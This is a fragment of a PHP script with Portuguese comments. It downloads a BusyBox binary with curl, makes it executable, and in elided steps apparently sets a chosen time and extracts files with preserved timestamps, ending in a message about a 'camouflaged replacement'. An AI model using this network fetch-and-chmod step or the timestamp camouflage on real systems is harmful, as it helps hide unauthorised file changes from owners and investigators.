...
// === 1. Baixa BusyBox se não existir ===
if (!file_exists($localBusybox)) {
    echo "\033[1;36m[*] Baixando BusyBox estático...\033[0m\n";
    shell_exec("curl -L -o busybox https://frippery.org/files/busybox/busybox-armv7l");
    shell_exec("chmod +x busybox");
}

if (!file_exists($localBusybox)) {
    echo "\033[1;31m[!] Falha ao baixar o BusyBox.\033[0m\n";
    exit(1);
}
...
// === 3. Entrada automática da hora (configure aqui se quiser fixo) ===
...
// === 7. Extrai o tar no destino preservando timestamps ===
...
echo "\n\033[1;32m[✓] Substituição camuflada concluída com sucesso.\033[0m\n";
